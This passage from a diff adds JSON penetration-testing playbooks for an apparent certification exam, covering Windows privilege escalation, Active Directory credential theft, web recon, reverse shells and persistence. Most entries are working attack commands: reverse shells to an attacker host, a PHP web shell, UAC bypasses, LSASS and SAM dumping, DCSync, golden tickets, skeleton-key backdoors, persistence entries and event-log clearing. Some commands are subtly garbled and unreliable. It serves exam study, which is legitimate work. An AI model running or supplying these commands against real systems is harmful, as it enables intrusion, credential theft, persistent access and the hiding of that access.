+            "fallback": "wmic service get name,displayname,pathname,startmode | findstr /i /v 'C:\\Windows\\'"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - DLL Hijacking",
+        "techniques": [
+          "dll-hijacking"
+        ],
+        "tools": [
+          "powerup",
+          "accesschk",
+          "msfvenom"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Service/app loads DLL from writable non-system directory",
+            "action": "Find-ProcessDLLHijack / Find-PathDLLHijack (PowerUp); craft malicious DLL with matching exports; msfvenom -f dll -o hijack.dll",
+            "fallback": "Process Monitor to find writable DLL load paths"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - Token Impersonation (Potato Family)",
+        "techniques": [
+          "token-impersonation"
+        ],
+        "tools": [
+          "printspoofer",
+          "godpotato",
+          "jucypotato",
+          "msfconsole"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SeImpersonatePrivilege = Enabled",
+            "action": "PrintSpoofer.exe -i -c cmd (most reliable on modern Win10/Server2016+); or GodPotato.exe -cmd 'C:\\payload.exe'",
+            "fallback": "JuicyPotato -l 1337 -p payload -t * -c {CLSID}; RoguePotato -r <attacker> -e payload -l 9999"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Weak Service / File Permissions",
+        "techniques": [
+          "weak-service-permissions",
+          "suid-abuse"
+        ],
+        "tools": [
+          "accesschk",
+          "icacls",
+          "powerup"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Service binary writable by non-admin",
+            "action": "accesschk.exe -uwcqv 'Authenticated Users' * -svc; sc config VulnSvc binpath= 'C:\\payload.exe'; sc start VulnSvc",
+            "fallback": "PowerUp: Get-ModifiableService -Verbose; Invoke-ServiceAbuse -Name 'VulnSvc' -Command 'net localgroup administrators user /add'"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - Scheduled Tasks & Registry AutoRun",
+        "techniques": [
+          "cron-jobs"
+        ],
+        "tools": [
+          "powerup",
+          "icacls",
+          "reg"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Task runs as SYSTEM/admin with writable script",
+            "action": "schtasks /query /fo LIST /v; icacls 'C:\\Scripts\\backup.bat' — overwrite script",
+            "fallback": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run; if writable, replace with payload"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 7 - GPP Cached Passwords / SYSVOL",
+        "techniques": [
+          "gpp-cached-passwords"
+        ],
+        "tools": [
+          "mimikatz",
+          "powerup"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SYSVOL XML files with cpassword",
+            "action": "findstr /S /I cpassword \\\\domain\\sysvol\\domain\\policies\\*.xml; gpp-decrypt <cpassword_value>",
+            "fallback": "Metasploit: post/windows/gather/credentials/gpp"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 8 - UAC Bypass",
+        "techniques": [
+          "uac-bypass"
+        ],
+        "tools": [
+          "msfconsole"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "User is local admin but running medium integrity",
+            "action": "fodhelper.exe bypass: reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d 'C:\\payload.exe' /f; reg add ... DelegateExecute /f; fodhelper.exe",
+            "fallback": "eventvwr.exe bypass: reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d 'C:\\payload.exe' /f; eventvwr.exe"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 9 - LSA Secrets & SAM Dump (for lateral movement)",
+        "techniques": [
+          "token-impersonation"
+        ],
+        "tools": [
+          "mimikatz",
+          "impacket"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Admin/SYSTEM already achieved",
+            "action": "reg save HKLM\\SAM sam.hive; reg save HKLM\\SYSTEM system.hive; reg save HKLM\\SECURITY security.hive; secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL; or mimikatz lsadump::sam; lsadump::secrets",
+            "fallback": "mimikatz privilege::debug; token::elevate; lsadump::dcsync (if DA)"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 10 - Kernel Exploits (CVE Catalogue)",
+        "techniques": [],
+        "tools": [
+          "msfconsole",
+          "searchsploit"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "OS is unpatched, systeminfo confirms vulnerable build",
+            "action": "MS08-067 (Conficker); MS16-032 (Secondary Logon); MS17-010 (EternalBlue); CVE-2019-0708 (BlueKeep); CVE-2020-1472 (Zerologon); CVE-2021-1675 (PrintNightmare); CVE-2021-1732 (Win32k); CVE-2021-3156 (Baron Samedit)",
+            "fallback": "Metasploit: local_exploit_suggester; or manual: searchsploit <cve> → -m → compile/run PoC"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 11 - Quick Decision Flow for the Exam",
+        "techniques": [],
+        "tools": [
+          "winpeas",
+          "powerup",
+          "printspoofer",
+          "msfconsole"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Low-priv shell obtained",
+            "action": "systeminfo + whoami /priv + whoami /groups → WinPEAS/PowerUp/Seatbelt/Sherlock in parallel → SeImpersonate first (PrintSpoofer) → service/registry/scheduled task/file perms → kernel CVE only if unpatched",
+            "fallback": "Always confirm final privilege with whoami /priv + whoami /groups + type C:\\Users\\Administrator\\Desktop\\root.txt"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "post-exploitation-argha-dey-methodology",
+    "zone": "post-exploitation",
+    "name": "Argha Dey Post-Exploitation Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Tool-agnostic post-exploitation workflow covering credential access, domain dominance, and persistence. Derived from the AD Hacking notes — commands for Kali Linux, Windows CMD, and PowerShell.",
+    "examHabits": [
+      "Dump credentials early — don't linger on a box without extracting hashes",
+      "Mimikatz in-memory via Invoke-Mimikatz to avoid disk-based AV detection",
+      "Screenshot flags immediately after gaining access",
+      "Use Beacon/Cobalt Strike for persistent C2 that survives 6+ hours",
+      "Check for domain admin tokens before attempting domain dominance"
+    ],
+    "quickRef": "Invoke-Mimikatz -DumpCreds | sekurlsa::logonpasswords | lsadump::dcsync /domain:<domain> /user:krbtgt | impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc-ip>",
+    "steps": [
+      {
+        "phase": "Phase 1 - Initial Credential Access",
+        "tools": [
+          "mimikatz",
+          "impacket",
+          "procdump",
+          "sekurlsa"
+        ],
+        "techniques": [
+          "mimikatz",
+          "lsass-dump"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "On-box with admin",
+            "action": "mimikatz # privilege::debug sekurlsa::logonpasswords sekurlsa::minidump lsass.dmp",
+            "fallback": "ProcDump: rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 708 c:\\temp\\lsass.dmp full — then parse offline"
+          },
+          {
+            "condition": "Remote host, no on-box execution needed",
+            "action": "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc-ip>",
+            "fallback": "Use Mimikatz DCSync: sekurlsa::minidump lsass.dmp — lsadump::dcsync /domain:<domain> /user:krbtgt"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Pre-Auth Info Leaks (No Credentials Needed)",
+        "tools": [
+          "ldapdomaindump",
+          "bloodhound",
+          "nuclei"
+        ],
+        "techniques": [
+          "ldapdump"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "DC is reachable on LDAP (389)",
+            "action": "ldapdomaindump -u '<user>' -p '<pass>' <dc-ip> — check Product_Version, System_Time, and any accounts without auth",
+            "fallback": "BloodHound: python3 bloodhound.py -d <domain> -u <user> -p <pass> --collection-method All"
+          },
+          {
+            "condition": "Always try early, even without a user",
+            "action": "Check for AS-REP roastable accounts: GetNPUsers.py <domain>/ -usersfile users.txt -f <users>.kirbi",
+            "fallback": "Try null session: smbclient -N -L //<dc-ip>/"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - Credential Gathering from AD",
+        "tools": [
+          "impacket",
+          "kerbrute",
+          "responder",
+          "mimikatz"
+        ],
+        "techniques": [
+          "kerberoasting",
+          "ntlm-cracking"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Valid username + can request TGS",
+            "action": "GetUserSPNs.py <domain>/<user> -request -dc-ip <dc> -tf <output>.kirbi",
+            "fallback": "Hashcat: hashcat -m 13100 hash.txt rockyou.txt"
+          },
+          {
+            "condition": "Need to enumerate users",
+            "action": "kerbrute userenum -d <domain> /usr/share/seclists/Usernames/Names/names.txt",
+            "fallback": "Use BloodHound for username enumeration via LDAP"
+          },
+          {
+            "condition": "On same subnet as domain users",
+            "action": "Responder -I eth0 -wrfPvE — capture NTLMv2 hashes from LLMNR/NBT-NS",
+            "fallback": "Crack offline with hashcat -m 560"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - NTLM Relay (Signing Not Required)",
+        "tools": [
+          "responder",
+          "impacket-ntlmrelayx",
+          "metasploit"
+        ],
+        "techniques": [
+          "ntlm-relay"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SMB/LDAP signing disabled on target",
+            "action": "ntlmrelayx.py -tf targets.txt -smb2socks -ts 445 — relay to SMB for shell",
+            "fallback": "Use Metasploit auxiliary/spoof/relay/ntlm_relay with crafted URL"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Authenticated Enumeration (LDAP Deep Dive)",
+        "tools": [
+          "bloodhound",
+          "ldapdomaindump",
+          "powerview",
+          "nuclei"
+        ],
+        "techniques": [
+          "powerview"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Have domain credentials",
+            "action": "SharpHound or bloodhound.py — collect all data, import .zip to BloodHound GUI, find shortest path to DA",
+            "fallback": "ldapdomaindump for quick group membership enumeration"
+          },
+          {
+            "condition": "On-box PowerShell execution",
+            "action": "Import PowerSploit — Get-NetComputer, Get-NetUser, Get-NetGroup — find privileged accounts",
+            "fallback": "Invoke-PrivescCheck — check for local privesc first"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - Foothold & Shell (Impacket Suite, PtH)",
+        "tools": [
+          "impacket-psexec",
+          "evil-winrm",
+          "metasploit"
+        ],
+        "techniques": [
+          "ps-Remoting",
+          "psexec"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "NTLM hash obtained (pass-the-hash)",
+            "action": "evil-winrm -i <ip> -u <user> -H '<hash>'",
+            "fallback": "psexec.py <domain>/<user>:<hash>@<ip>"
+          },
+          {
+            "condition": "WinRM open (5985/5986)",
+            "action": "evil-winrm -i <ip> -u <user> -p <pass> — or Metasploit aux/windows/winrm/winrm_auth_method",
+            "fallback": "Check for unencrypted WinRM: evil-winrm -i <ip> -u <user> -p <pass> -H '<hash>'"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 7 - Domain Privilege Escalation",
+        "tools": [
+          "mimikatz",
+          "impacket-secretsdump",
+          "bloodhound"
+        ],
+        "techniques": [
+          "kerberoasting",
+          "dcsync"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Domain user with some privileges",
+            "action": "Search for constrained/unconstrained delegation, writable SPNs, and DCSync rights",
+            "fallback": "Check for GenericAll/GenericWrite permissions via BloodHound"
+          },
+          {
+            "condition": "DA account obtained (golden ticket)",
+            "action": "mimikatz # kerberos::golden /user:administrator /domain:<domain> /sid:<sid> /krbtgt:<hash> /ptt",
+            "fallback": "Or use ticketer.py from Impacket: ticketer -nthash <nthash> -domain-sid <sid> -domain <domain> administrator"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 8 - Persistence",
+        "tools": [
+          "mimikatz",
+          "impacket",
+          "powerview"
+        ],
+        "techniques": [
+          "persistence-registry"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Maintaining domain admin access",
+            "action": "mimikatz # misc::skeleton (backdoor password for all accounts)",
+            "fallback": "Add DA user: net user <user> <pass> /domain /add && net group <group> /domain /add"
+          },
+          {
+            "condition": "DC shadow attack possible",
+            "action": "mimikatz # privilege::debug — then DCShadow to modify AD objects",
+            "fallback": "SID History abuse, or add to PrintSpoofer for SYSTEM on DC"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 9 - Cleanup & Covering Tracks",
+        "tools": [
+          "mimikatz",
+          "impacket"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Exam environment — must clean up",
+            "action": "Remove skeleton backdoor, delete added users, clear event logs",
+            "fallback": "mimikatz # event::clear — clears security event log"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "web-app-recon-argha-dey-methodology",
+    "zone": "web",
+    "name": "Argha Dey Web Application Recon Checklist",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Phase-by-phase web application reconnaissance derived from the Recon & Enumeration notes. Emphasizes the Nmap -> Fingerprint -> Fuzz -> Leak -> Foothold chain used in 90% of CPENT web challenges.",
+    "examHabits": [
+      "nmap's http-generator script output often reveals the exact CMS/version before running specialized scanners",
+      "Check ftp-anon in every scan — an FTP open with anonymous allows often contains backup files with creds",
+      "Always check /robots.txt, /.git/, /backup/, and /server-status/",
+      "If the site returns the Apache default page, the real app is under a different vhost or path — fuzz for it",
+      "Use feroxbuster first (faster than gobuster/ffuf) then refine with extension-aware fuzzing"
+    ],
+    "quickRef": "nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | whatweb http://<ip>/ | wpscan --url http://<ip>/ -e vp,u,vt,cb,m --api-token <token>",
+    "steps": [
+      {
+        "phase": "Phase 1 - Network & Service Recon",
+        "tools": [
+          "nmap",
+          "nc",
+          "curl",
+          "whatweb"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Standard engagement",
+            "action": "nmap -sC -sV -T4 -Pn -A -oN <ip>.txt <ip>",
+            "fallback": "nmap -p- -T4 --min-rate 5000 -oG allports.txt <ip> then re-scan discovered ports with -sV"
+          },
+          {
+            "condition": "Open web ports found (80,443,8080,8000,8443)",
+            "action": "Note exact port and banner. Look for http-title, http-server-header, http-generator",
+            "fallback": "Jenkins/Tomcat often on 8080/8081 — check for /script/text, /manager/html"
+          },
+          {
+            "condition": "Anonymous FTP allowed (code 230)",
+            "action": "ftp <ip> — login anonymous:anonymous — browse for backups, creds, configs",
+            "fallback": "Check for shared directories with write access (upload webshell)"
+          },
+          {
+            "condition": "OS/kernel version detected in scan",
+            "action": "Note for later CVE-based privilege escalation hunting",
+            "fallback": "If no version, guess from Apache/Nginx version and search for known exploits"
+          },
+          {
+            "condition": "Port 22/21/23 open alongside web",
+            "action": "Try default credentials — admin:admin, root:toor, cisco:cisco",
+            "fallback": "Banner grab with nc -nv <ip> <port>"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Web Technology Fingerprinting",
+        "tools": [
+          "whatweb",
+          "curl",
+          "nmap",
+          "wpscan",
+          "nuclei"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Default 'Apache2 Ubuntu Default Page' seen",
+            "action": "App may not be on / — fuzz for vhosts and alternative paths",
+            "fallback": "Check Host: header fuzzing with ffuf -H 'Host: FUZZ.<ip>'"
+          },
+          {
+            "condition": "http-generator: WordPress x.x.x detected",
+            "action": "Run wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --api-token <token>",
+            "fallback": "Manual version check via /readme.html or /wp-includes/version.php"
+          },
+          {
+            "condition": "Login page branding shows product name (OTRS, Jenkins, etc.)",
+            "action": "Search 'default creds <product>' + CVE for that version",
+            "fallback": "Check view-source for commented-out links or file paths"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - Directory, File & Vhost Fuzzing",
+        "tools": [
+          "feroxbuster",
+          "ffuf",
+          "dirb",
+          "gobuster"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "First pass",
+            "action": "feroxbuster -u http://<ip>/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt",
+            "fallback": "dirb http://<ip>/ /usr/share/seclists/Discovery/Web-Content/common.txt"
+          },
+          {
+            "condition": "Need deeper directory bust",
+            "action": "ffuf -u http://<ip>/FUZ2Z -w /usr/share/seclists/Discovery/Web-Content/big.txt -e .php,.html,.txt",
+            "fallback": "dirb with multiple extensions enabled"
+          },
+          {
+            "condition": "Vhost suspected (same IP, multiple sites)",
+            "action": "ffuf -u http://<ip>/ -H 'Host: FUZZ' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+            "fallback": "Check Host header injection: Host: FUZZ -> if page changes, vhost exists"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - Hidden File & Leak Hunting",
+        "tools": [
+          "curl",
+          "ffuf",
+          "git-dumper",
+          "nuclei"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "robots.txt or sitemap.xml found",
+            "action": "curl http://<ip>/robots.txt — look for Disallow entries revealing hidden paths",
+            "fallback": "Check sitemap.xml for URLs not found during fuzzing"
+          },
+          {
+            "condition": "/.git/ directory discovered",
+            "action": "git-dumper https://github.com/lianh/docem — extract git history; search for commits with secrets",
+            "fallback": "Manual: curl http://<ip>/.git/config — check remote URL for repo path"
+          },
+          {
+            "condition": "Backup files suspected",
+            "action": "ffuf -u http://<ip>/FUZZ -w wordlist with extensions: .bak,.save,.old,.zip,.tar.gz,.sql",
+            "fallback": "grep -R -i -E 'pass|secret|key|token' extracted_dir/"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Anonymous Service Access",
+        "tools": [
+          "nmap",
+          "curl",
+          "nc",
+          "smbmap",
+          "enum4linux"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SMB open (port 445)",
+            "action": "nmap -p445 --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 <ip>",
+            "fallback": "smbmap -H <ip> — check for null-session shares"
+          },
+          {
+            "condition": "SMTP open (port 25)",
+            "action": "smtp-user-enum -U /usr/share/wordlists/usernames.txt -t <ip>",
+            "fallback": "Verify user existence via VRFY/EXPN or just proceed with user enumeration"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - CMS / Application-Specific Enumeration",
+        "tools": [
+          "wpscan",
+          "joomscan",
+          "nuclei",
+          "cmsmap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "WordPress confirmed",
+            "action": "wpscan --url http://<ip>/ -e vp,u,vt,cb,dbe,m -v --random-user-agent --api-token <token>",
+            "fallback": "Manual: curl /wp-json/wp/v2/users | jq for user enumeration"
+          },
+          {
+            "condition": "Other CMS detected (Joomla, Drupal, etc.)",
+            "action": "CMSmap -u http://<ip> — or nuclei -u http://<ip> -tags <cms>",
+            "fallback": "Searchsploit for the specific CMS version CVEs"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 7 - Intercepting Proxy Workflow",
+        "tools": [
+          "burpsuite",
+          "zap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Web app with user interaction",
+            "action": "Set browser proxy to Burp. Enable intercept. Test every parameter with single quote, <script>, ${IFS}, |id",
+            "fallback": "Use Burp Intruder for quick fuzzing of interesting parameters"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 8 - Master Recon Checklist (mental, every new Web Range IP)",
+        "tools": [],
+        "decisionPoints": [
+          {
+            "condition": "Always check these 5 things for every new web target",
+            "action": "1) /robots.txt 2) /server-status 3) /.git/config 4) /backup or /.bak 5) ftp-anon",
+            "fallback": "N/A — this is the checklist itself"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "windows-privesc-argha-dey-v2-methodology",
+    "zone": "privilege-escalation",
+    "name": "Argha Dey Windows Privilege Escalation Deep Dive",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Enhanced Windows privilege escalation methodology from the Windows Privilege Escalation notes, focusing on the decision flow for the exam environment. Covers PowerUp, UAC bypass, and exploit catalog lookup.",
+    "examHabits": [
+      "Run systeminfo > systeminfo.txt and check for missing patches first",
+      "Whoami /priv — always check for SeImpersonatePrivilege, SeBackupPrivilege, SeDebugPrivilege",
+      "Check if PowerShell execution is locked down — try v2, v4, or IEX from memory",
+      "winPEAS.exe output is huge — pipe to findstr to filter: winPEAS.exe quiet",
+      "Token manipulation: check who is in the local Administrators group"
+    ],
+    "quickRef": "systeminfo | findstr /i 'OS.Name OS.Version Hotfix'; whoami /priv; net user; net localgroup administrators",
+    "steps": [
+      {
+        "phase": "Phase 0 - Baseline Enumeration",
+        "tools": [
+          "whoami",
+          "systeminfo",
+          "winpeas",
+          "seatbelt"
+        ],
+        "techniques": [
+          "win-pe-confirm"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Check current privileges",
+            "action": "whoami /priv — look for SeImpersonatePrivilege (JuicyPotato), SeBackupPrivilege, SeDebugPrivilege",
+            "fallback": "If limited, focus on file permission exploits and AlwaysInstallElevated"
+          },
+          {
+            "condition": "Check OS version and patches",
+            "action": "systeminfo | findstr /i 'OS.Name OS.Version Hotfix'",
+            "fallback": "wmic qfe list — look for missing KB patches for known exploits"
+          },
+          {
+            "condition": "Need automated enumeration",
+            "action": "winPEAS.exe quiet — review output for unquoted paths, weak perms, AlwaysInstallElevated",
+            "fallback": "Seatbelt.exe — quieter, targeted checks"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 1 - AlwaysInstallElevated",
+        "tools": [
+          "whoami",
+          "icacls"
+        ],
+        "techniques": [
+          "alwaysinstall"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "User has SeDebugPrivilege or local admin",
+            "action": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+            "fallback": "Check both HKLM and HKCU — if both are 1, compile a .msi to .exe payload"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Unquoted Service Paths",
+        "tools": [
+          "powerup",
+          "winpeas"
+        ],
+        "techniques": [
+          "unquoted-service"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "winPEAS flags 'Unquoted Service Path'",
+            "action": "PowerUp.ps1: Write-ServiceBinary — or place exe in the unquoted path directory",
+            "fallback": "Search manually: sc query | findstr SERVICE, then check sc qc <service> for unquoted paths"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - DLL Hijacking",
+        "tools": [
+          "powerup",
+          "procmon",
+          "winpeas"
+        ],
+        "techniques": [
+          "dll-hijack"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Service runs as SYSTEM with unquoted binary path",
+            "action": "PowerUp: Invoke-ServiceChange -Name '<service>' — point binary to attacker-controlled DLL",
+            "fallback": "Use procmon to find which DLLs load from non-existent or hijacked paths"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - Token Impersonation (Potato Family)",
+        "tools": [
+          "juicypotato",
+          "printspoofer",
+          "roguepotato"
+        ],
+        "techniques": [
+          "token-impersonation"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SeImpersonatePrivilege present",
+            "action": "JuicyPotato -m 10 -l 1337 -f -- -z (try multiple CLSIDs)",
+            "fallback": "PrintSpoofer: Spoolsample + wait — SYSTEM privilege via printer bug"
+          },
+          {
+            "condition": "Windows 10/11 with Spoolsanity",
+            "action": "PrintSpoofer.exe or Spoolsample via RPC",
+            "fallback": "Check if Spools service is running: sc query spooler"
+          },
+          {
+            "condition": "Can't get local admin",
+            "action": "Check for WebDav Mini-Redirector ( WebClient service ), WebDAV exploit",
+            "fallback": "Try NT API handle duplication or named pipe impersonation"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Weak Service / File Permissions",
+        "tools": [
+          "powerup",
+          "winpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Service binary is writable by current user",
+            "action": "Replace service executable with reverse shell payload — restart service",
+            "fallback": "Use PowerUp: Set-ServiceBinary — or compile custom service"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - Kernel Exploits (CVE Catalogue)",
+        "tools": [
+          "windows-exploit-suggester",
+          "searchsploit",
+          "metasploit"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Specific OS version with known CVEs",
+            "action": "windows-exploit-suggester --database 2019-01-01.xlsx --systeminfo systeminfo.txt",
+            "fallback": "Searchsploit or exploit-db for the kernel version"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 7 - Quick Decision Flow for the Exam",
+        "tools": [],
+        "decisionPoints": [
+          {
+            "condition": "Exam decision tree — follow this order",
+            "action": "1) AlwaysInstallElevated → 2) Unquoted Service Path → 3) DLL Hijacking → 4) SeImpersonate (JuicyPotato) → 5) Weak File/Svc Perm → 6) Kernel CVE",
+            "fallback": "If all fail, check for 777 scripts in scheduled tasks or writable directories in PATH"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "reverse-shells-argha-dey-methodology",
+    "zone": "exploitation-frameworks",
+    "name": "Argha Dey Reverse Shells & Stabilization Playbook",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Comprehensive reverse shell generation, delivery, and stabilization guide compiled from the Pivoting & Tunneling, OS Command Injection, and Linux Privilege Escalation notes.",
+    "examHabits": [
+      "Test reverse shell connectivity with a simple nc listener BEFORE running the payload",
+      "Always use rlwrap with nc -lvnp to have proper shell history",
+      "Python pty.spawn for interactive shell; Ctrl+Z + stty raw -echo + fg for terminal upgrade",
+      "Have socat backup ready — if one-liners fail, use a bind shell via socat",
+      "Document local IP and port on your attack machine before shell delivery"
+    ],
+    "quickRef": "rlwrap nc -lvnp 4444 | grep -a 'connect to' | ...",
+    "steps": [
+      {
+        "phase": "Phase 1 - Shell Selection (Choose by Target)",
+        "tools": [
+          "bash",
+          "python",
+          "php",
+          "perl",
+          "ruby",
+          "ncat",
+          "socat"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Linux target, nc/bash available",
+            "action": "bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'",
+            "fallback": "Use python: python3 -c 'import socket,subprocess,os;...'"
+          },
+          {
+            "condition": "Windows target, PowerShell available",
+            "action": "PowerShell IEX one-liner reverse shell (see Nishang/Invoke-PowerShellTcp)",
+            "fallback": "Use Nishang or Invoke-PowerShellTcp one-liner"
+          },
+          {
+            "condition": "PHP target (web shell upload)",
+            "action": "<?php system($_GET['cmd']); ?>",
+            "fallback": "Use weevely or b374k for more features"
+          },
+          {
+            "condition": "No standard shells work (filtered/blocked)",
+            "action": "mkfifo /tmp/f; nc &lt;attacker&gt; 4444 0&lt;/tmp/f 2>&1; cat /tmp/f | /bin/sh -c 'cat &gt;/tmp/f' >/tmp/f 2>&1; nc &lt;attacker&gt; 4444",
+            "fallback": "Use a reverse HTTP/HTTPS tunnel with chisel or ligolo"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Bind Shell Alternatives",
+        "tools": [
+          "ncat",
+          "socat",
+          "python",
+          "perl"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Reverse shell is blocked (egress filtering)",
+            "action": "Try bind shell: nc -l -p 4444 -e /bin/bash (then connect from attacker)",
+            "fallback": "socat: socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - Shell Stabilization",
+        "tools": [
+          "python",
+          "socat"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Got a basic shell, need interactive terminal",
+            "action": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "fallback": "perl: perl -e 'exec(\"/bin/bash\")'"
+          },
+          {
+            "condition": "Shell works but terminal is messy",
+            "action": "Ctrl+Z → stty raw -echo → fg → export TERM=xterm",
+            "fallback": "Use socat for full terminal emulation"
+          },
+          {
+            "condition": "Need to upgrade a dumb shell to full TTY",
+            "action": "python -c 'import pty,os,os; pty.spawn(\"/bin/bash\"); os.chmod(\"/tmp\",0o777)'",
+            "fallback": "Upload a precompiled binary or use awk/sed for TTY allocation"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - Tunneling Through Compromised Host",
+        "tools": [
+          "chisel",
+          "ligolo",
+          "sshuttle",
+          "proxychains"
+        ],
+        "techniques": [
+          "socks-proxy",
+          "port-forwarding"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Need to reach internal network from compromised host",
+            "action": "Reverse SOCKS: ./chisel client <attacker>:8000 R:socks — then proxychains scan internal",
+            "fallback": "ligolo: ligolo -relay <attacker>:5100 — then run internal nmap through the tunnel"
+          },
+          {
+            "condition": "SSH access to pivot",
+            "action": "ssh -D 1080 <user>@<pivot> (dynamic port forward) — then proxychains4 curl internal",
+            "fallback": "sshuttle -r <user>:<pivot> <internal-subnet>/24 for transparent routing"
+          },
+          {
+            "condition": "Only have a web shell",
+            "action": "Upload chisel/ligolo binary to target — run reverse proxy",
+            "fallback": "Use reGeorg or tunna for HTTP-based tunneling through the webshell"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Persistence via Reverse Shells",
+        "tools": [
+          "cron",
+          "systemd",
+          "at",
+          "screen",
+          "tmux"
+        ],
+        "techniques": [
+          "persistence-cron"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Need persistent access on Linux",
+            "action": "echo '* * * * * /tmp/reverse_shell.sh' | crontab -",
+            "fallback": "Create systemd service in /etc/systemd/system/ or user systemd in ~/.config/systemd/"
+          },
+          {
+            "condition": "Windows persistence",
+            "action": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyShell /t REG_SZ /d 'C:\\shell.exe'",
+            "fallback": "Use schtasks for scheduled execution"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ctf-argha-dey-methodology",
+    "zone": "ctf",
+    "name": "Argha Dey CTF Challenge Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Systematic approach to CTF challenges covering cryptography, steganography, forensics, and web exploitation. Based on patterns observed in CPENT-style CTF challenges.",
+    "examHabits": [
+      "steghide steghide steghide — try the same passphrase multiple times",
+      "Check metadata with exiftool on every file first",
+      "Try CyberChef for common encodings (base64, base32, URL, hex, ROT13, binary, Morse)",
